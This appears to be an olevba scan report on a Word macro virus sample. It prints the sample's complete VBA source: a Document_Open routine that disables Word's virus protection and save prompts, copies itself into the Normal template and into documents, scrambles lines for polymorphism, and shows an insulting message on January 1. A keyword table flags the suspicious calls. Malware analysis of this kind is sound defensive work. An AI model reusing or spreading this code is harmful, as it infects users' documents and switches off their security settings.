olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-49cfe81491b746f9a491921bff031917256730ef
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-49cfe81491b746f9a491921bff031917256730ef - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()

On Error Resume Next

HQ47 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

Options.VirusProtection = 0

BR34 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

Options.ConfirmConversions = 0

Options.SaveNormalPrompt = 0

Application.EnableCancelKey = 0

If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set UD52 = ActiveDocument.VBProject.VBComponents.Item(1)

JQ17 = True

End If

If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set UD52 = NormalTemplate.VBProject.VBComponents.Item(1)

FM91 = True

End If

If FM91 <> True And JQ17 <> True Then GoTo UP10

If FM91 = True Then UD52.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, HQ47 - 1))

If JQ17 = True Then UD52.CodeModule.AddFromString ("Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, BR34 - 1))

With UD52.CodeModule

For x = 2 To (UD52.CodeModule.CountOfLines - 1) Step 2

.replaceline x, (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " = " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " + " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22)))

Next x

End With

If Month(Now) = 1 And Day(Now) = 1 Then MsgBox "I think " & Application.UserName & " is a big stupid jerk!"

UP10:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

